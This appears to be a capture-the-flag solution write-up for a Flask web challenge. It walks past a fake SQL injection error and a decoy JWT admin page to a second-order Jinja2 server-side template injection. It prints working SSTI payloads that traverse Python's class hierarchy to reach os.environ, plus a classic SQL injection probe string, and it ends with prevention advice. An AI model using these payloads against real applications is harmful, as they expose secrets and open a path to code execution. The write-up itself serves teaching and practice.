# Solution Writeup

## Challenge: The Admin Panel That Isn't

### Initial Reconnaissance

1. Visit the challenge URL - find a login portal
2. Check /robots.txt - discover /secret-backup.zip
3. Download and extract backup.zip:
   - config_old.txt: admin:p@ssw0rd123
   - notes.txt: mentions flag moved to environment
   - flag.txt: empty

### Red Herring #1: SQL Injection

The login form has a comment: `<!-- TODO: sanitise user inputs before v2 release -->`

Try SQLi: `admin' OR '1'='1`
Result: "OperationalError: near 'OR': syntax error in query"

This looks vulnerable but is actually a fake error. The app uses parameterized queries.

### Red Herring #2: JWT Role Escalation

Login with admin:p@ssw0rd123 and capture the JWT token.

Decode the JWT:
```json
{
  "user": "admin",
  "role": "admin",
  "exp": 1778147585
}
```

Visit /admin - shows a fake flag: `flag{not_the_real_one_nice_try}`

This is a canary. The real flag is not here.

### Finding the Real Vulnerability

Register a new account with a test payload in the display name:
- Username: testuser
- Password: password123
- Display Name: `{{7*7}}`

Login and visit /dashboard.

**Result**: The welcome message shows "Welcome back, 49!" instead of "Welcome back, {{7*7}}!"

This confirms Server-Side Template Injection (SSTI) in Jinja2.

### Exploitation

The display_name is stored in the database and later rendered unsafely via `render_template_string()`.

#### Step 1: Test blocked payloads

Try `{{config}}` - returns fake config with SECRET_KEY: hunter2
Try `{{__import__('os')}}` - returns "None"

These are blocked by the application.

### Step 2: Use subclass traversal

The real solve path uses Python's MRO (Method Resolution Order) to access dangerous classes.

Register with display name:
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

This lists all subclasses of object. Look for useful classes like:
- subprocess.Popen
- os._wrap_close
- warnings.catch_warnings

#### Step 3: Access os.environ

Find a class that gives access to os module. Example payload:

```python
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].environ}}
```

Or use warnings.catch_warnings:

```python
{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').environ['FLAG']}}
```

The exact index varies by Python version. Players must enumerate subclasses to find the right one.

#### Step 4: Extract the flag

Once you find a working payload that accesses os.environ, the real flag is revealed:

```
flag{your_actual_flag_here}
```

## Key Takeaways

1. **Second-order vulnerabilities**: The payload is stored during registration and executed later on dashboard render
2. **Red herrings**: Multiple fake vulnerabilities waste time (SQLi, JWT, fake admin panel)
3. **Partial blocking**: Blocking `__import__` and `config` forces players to use subclass traversal
4. **SSTI exploitation**: Understanding Python's object model is key to exploitation

## Prevention

To fix this vulnerability:

1. Never use `render_template_string()` with user input
2. Use `render_template()` with proper template files
3. Jinja2 auto-escapes variables in templates
4. If dynamic rendering is needed, use a sandboxed environment with strict whitelisting
